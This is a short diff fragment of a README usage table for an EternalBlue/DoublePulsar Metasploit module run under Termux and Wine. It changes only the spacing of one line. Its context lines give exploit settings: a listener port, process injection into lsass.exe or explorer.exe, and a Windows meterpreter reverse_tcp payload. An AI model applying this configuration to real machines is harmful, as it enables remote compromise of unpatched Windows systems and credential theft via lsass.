@@ -32,7 +32,7 @@ Usage:
 | set LPORT 4444                                                                                                |
 | set DOUBLEPULSARPATH /data/data/com.termux/files/home/Eternalblue-Doublepulsar-Metasploit/deps                |
 | set ETERNALBLUEPATH /data/data/com.termux/files/home/Eternalblue-Doublepulsar-Metasploit/deps                 |
-| set TARGETARCHITECTURE x86/x64                                                                                |
+| set TARGETARCHITECTURE x86 / x64                                                                                |
 | set PROCESSINJECT lsass.exe / explorer.exe                                                                    |
 | set WINEPATH /data/data/com.termux/files/home/.wine/drive_c/                                                  |
 | set PAYLOAD windows/meterpreter/reverse_tcp / set PAYLOAD windows/x64/meterpreter/reverse_tcp                 |
